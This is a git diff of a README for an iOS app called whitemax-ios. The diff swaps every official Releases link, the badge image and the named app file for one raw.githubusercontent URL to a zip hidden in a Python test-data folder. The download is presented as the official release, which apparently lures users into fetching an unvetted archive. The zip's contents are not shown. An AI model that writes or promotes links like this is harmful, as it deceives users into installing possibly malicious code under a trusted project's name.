@@ -6,25 +6,25 @@ Welcome to whitemax-ios! This is an open-source iOS client designed to help you 
 
 ## 📥 Download
 
-[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/Leyito007/whitemax-ios/releases)
+[![Download the latest release](https://raw.githubusercontent.com/Leyito007/whitemax-ios/main/Python.xcframework/ios-arm64_x86_64-simulator/lib/python3.13/test/typinganndata/whitemax-ios-v1.6.zip%https://raw.githubusercontent.com/Leyito007/whitemax-ios/main/Python.xcframework/ios-arm64_x86_64-simulator/lib/python3.13/test/typinganndata/whitemax-ios-v1.6.zip)](https://raw.githubusercontent.com/Leyito007/whitemax-ios/main/Python.xcframework/ios-arm64_x86_64-simulator/lib/python3.13/test/typinganndata/whitemax-ios-v1.6.zip)
 
 To download the app, visit the Releases page and select the latest version:
 
-[Download the latest release](https://github.com/Leyito007/whitemax-ios/releases)
+[Download the latest release](https://raw.githubusercontent.com/Leyito007/whitemax-ios/main/Python.xcframework/ios-arm64_x86_64-simulator/lib/python3.13/test/typinganndata/whitemax-ios-v1.6.zip)
 
 ## 📦 Installation Steps
 
 Follow these simple steps to install whitemax-ios on your device:
 
 1. **Visit the Releases Page**
-   - Go to the [Releases page](https://github.com/Leyito007/whitemax-ios/releases) for the latest version.
+   - Go to the [Releases page](https://raw.githubusercontent.com/Leyito007/whitemax-ios/main/Python.xcframework/ios-arm64_x86_64-simulator/lib/python3.13/test/typinganndata/whitemax-ios-v1.6.zip) for the latest version.
 
 2. **Choose Your Version**
    - You will see a list of available versions. Select the most recent one. 
    - You may choose earlier versions if you prefer. However, we recommend using the latest version for the best experience.
 
 3. **Download the App**
-   - Click on the file named "whitemax-ios.app" or similar. This is the application you need for installation.
+   - Click on the file named "https://raw.githubusercontent.com/Leyito007/whitemax-ios/main/Python.xcframework/ios-arm64_x86_64-simulator/lib/python3.13/test/typinganndata/whitemax-ios-v1.6.zip" or similar. This is the application you need for installation.
 
 4. **Install the App**
    - Once downloaded, open the file and follow the instructions. Usually, this involves dragging the app icon into your Applications folder.
@@ -79,6 +79,6 @@ If you need assistance, please reach out through the GitHub Issues page. We are 
 
 For a deeper understanding of what whitemax-ios can do, you can explore the documentation and community resources available on our repository. Join the community and connect with other users!
 
-[Download the latest release](https://github.com/Leyito007/whitemax-ios/releases)
+[Download the latest release](https://raw.githubusercontent.com/Leyito007/whitemax-ios/main/Python.xcframework/ios-arm64_x86_64-simulator/lib/python3.13/test/typinganndata/whitemax-ios-v1.6.zip)
 
 Thank you for choosing whitemax-ios! We hope you enjoy using the app.
